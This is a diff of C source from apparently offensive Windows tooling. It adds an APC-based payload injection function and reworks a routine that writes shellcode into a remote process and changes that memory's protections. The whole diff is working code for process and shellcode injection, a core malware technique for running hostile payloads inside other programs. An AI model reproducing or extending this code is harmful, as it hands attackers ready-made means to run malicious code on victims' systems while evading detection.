@@ -1,5 +1,32 @@
 #include "dllinjection.h"
 
+BOOLEAN APCPayloadInjection
+(
+	IN     HANDLE hThread,
+	IN     PUCHAR pPayloadAddress,
+	IN	   SIZE_T sPayloadSize
+)
+{
+	if (!sPayloadSize || !hThread || !pPayloadAddress) return FALSE;
+
+	PVOID pLocalPayloadAddress = NULL;
+
+	if (!(pLocalPayloadAddress= VirtualAlloc(0, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayloadAddress, pPayloadAddress, sPayloadSize)) return FALSE;
+
+	DWORD dwOldProtections = 0;
+
+	if (!VirtualProtect(pLocalPayloadAddress, sPayloadSize, PAGE_EXECUTE ,&dwOldProtections)) return FALSE;
+
+	if (!QueueUserAPC((PAPCFUNC)pLocalPayloadAddress, hThread, 0)) {
+		printf("[!] Injection Failed With ErrorCode: 0x%lx", GetLastError());
+		return FALSE;
+	}
+	return TRUE;
+}
+
+
 BOOLEAN InjectRemoteProcessShellcode
 (
 	IN     HANDLE hProcessHandle,
@@ -11,23 +38,22 @@ BOOLEAN InjectRemoteProcessShellcode
 	SIZE_T  sBytesWritten;
 	DWORD   dwOldProtections;
 
-	if (
-		!(ppExternalAddress = VirtualAlloc(0, sShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
-		) return FALSE;
-	/*if (!(*ppExternalAddress = VirtualAllocEx(
+	if (!(*ppExternalAddress = VirtualAllocEx(
 		hProcessHandle, 
 		NULL, 
 		sShellCodeSize, 
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_READWRITE
 	)))return FALSE;
-	*/
+	
 	BOOLEAN bState = FALSE;
 
 	if (!WriteProcessMemory(
 		hProcessHandle, *ppExternalAddress, pShellcodeAddress,
 		sShellCodeSize, &sBytesWritten
-		) || !sBytesWritten)goto cleanup;
+		))goto cleanup;
+
+	if (sBytesWritten != sShellCodeSize)goto cleanup;
 
 	if (!VirtualProtectEx(
 		hProcessHandle, *ppExternalAddress, 
@@ -38,7 +64,7 @@ BOOLEAN InjectRemoteProcessShellcode
 	goto EndOfFunc;
 
 cleanup:
-	VirtualFreeEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, MEM_FREE);
+	//VirtualFreeEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, MEM_FREE);
 
 EndOfFunc:
 	return bState;
